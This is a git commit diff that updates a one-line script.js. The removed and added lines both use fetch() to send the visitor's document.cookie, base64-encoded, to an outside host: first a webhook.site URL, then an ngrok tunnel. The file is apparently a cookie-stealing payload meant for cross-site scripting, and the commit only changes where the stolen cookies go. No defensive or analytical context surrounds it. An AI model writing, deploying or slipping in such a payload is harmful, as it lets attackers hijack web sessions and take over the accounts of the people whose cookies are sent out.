3172987ff3f87999c1fe01b6daa0d2b3b274161b
Lo12code <58741785+Lo12code@users.noreply.github.com>
2025-07-09 13:53:36 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/f75ace0e-7a05-41e7-9cd2-822e07d2fc3f?data='+btoa(document.cookie)); //?data='+btoa(document.cookie);
+fetch('https://5312afb3585c.ngrok-free.app?data='+btoa(document.cookie)); //?data='+btoa(document.cookie);
